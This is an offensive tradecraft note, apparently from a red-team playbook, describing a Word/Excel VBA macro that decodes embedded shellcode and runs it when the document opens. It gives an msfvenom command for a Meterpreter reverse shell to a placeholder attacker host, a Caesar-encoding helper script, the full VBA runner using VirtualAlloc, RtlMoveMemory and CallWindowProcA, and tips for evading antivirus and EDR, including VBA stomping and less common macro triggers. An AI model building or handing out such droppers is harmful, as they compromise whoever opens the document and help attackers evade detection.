# 07.06 Custom VBA Macro Shellcode Runner

> Office VBA macro that allocates memory, decodes embedded shellcode, and runs it via CallWindowProc.

## Overview

VBA in Word/Excel can call Win32 APIs directly via Declare statements. The pattern: declare VirtualAlloc + RtlMoveMemory + CallWindowProcA, embed shellcode as a string array (or Caesar-encoded), allocate RWX memory, copy shellcode in, fire CallWindowProcA. Bypasses naive content-scanning because the shellcode lives as character codes split across an array, then re-assembled and obfuscated at runtime. AV-fragile — pair with a Caesar/XOR encoded payload and VBA stomping for stealth.

## Steps

- **Step 1** - Generate raw shellcode with msfvenom or Donut.
- **Step 2** - Convert to Caesar/XOR encoded integer array.
- **Step 3** - Drop into VBA template — Word: Developer → Visual Basic → ThisDocument → Document_Open.
- **Step 4** - Save as macro-enabled .docm.
- **Step 5** - For OPSEC: VBA-stomp source (strip p-code source, leave only p-code) — defeats source-level static analysis.

## Commands

### Generate shellcode

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<ATTACKER> LPORT=443 -f raw -o sc.bin
```

### Caesar encode to integer array (Python helper)

```python
with open('sc.bin','rb') as f: sc = f.read()
shift = 7  # Caesar shift
encoded = [(b - shift) & 0xFF for b in sc]
# print as VBA array
out = 'Dim shellcode() As Long\nshellcode = Array(' + ','.join(str(x) for x in encoded) + ')'
print(out[:300])
```

### Full VBA runner

```vba
Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As LongPtr, ByVal dwSize As LongPtr, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal Destination As LongPtr, ByRef Source As Any, ByVal Length As LongPtr) As LongPtr
Private Declare PtrSafe Function CallWindowProcA Lib "user32" (ByVal lpPrevWndFunc As LongPtr, ByVal hWnd As LongPtr, ByVal Msg As Long, ByVal wParam As LongPtr, ByVal lParam As LongPtr) As LongPtr

Sub Auto_Open()
    Document_Open
End Sub

Sub Document_Open()
    Dim shellcode() As Byte
    Dim i As Long
    Dim shift As Long
    shift = 7    ' Caesar shift used at encode time
    Dim raw() As Long
    raw = Array(_REPLACE_WITH_ENCODED_BYTES_)   ' paste integer array from helper here
    ReDim shellcode(UBound(raw))
    For i = 0 To UBound(raw)
        shellcode(i) = (raw(i) + shift) And &HFF
    Next i
    
    Dim addr As LongPtr
    addr = VirtualAlloc(0, UBound(shellcode) + 1, &H3000, &H40)   ' MEM_COMMIT|RESERVE, RWX
    RtlMoveMemory addr, shellcode(0), UBound(shellcode) + 1
    CallWindowProcA addr, 0, 0, 0, 0
End Sub
```

### OPSEC

```text
Modern AV/EDR signatures:
  - Suspicious API combinations (VirtualAlloc + RtlMoveMemory + CallWindowProc) → use ShellExecute via WMI or RegisterDeviceNotificationA as alternative trampoline
  - Long integer arrays in VBA source → break into chunks + base64 or external download
  - Auto_Open + ThisDocument.Document_Open → use less-common triggers: Document_Close, AutoExec, app.onclick on a hidden button
VBA Stomping defeats source-level static analysis on Office 2010+ where the stored p-code overrides the source when versions match
```
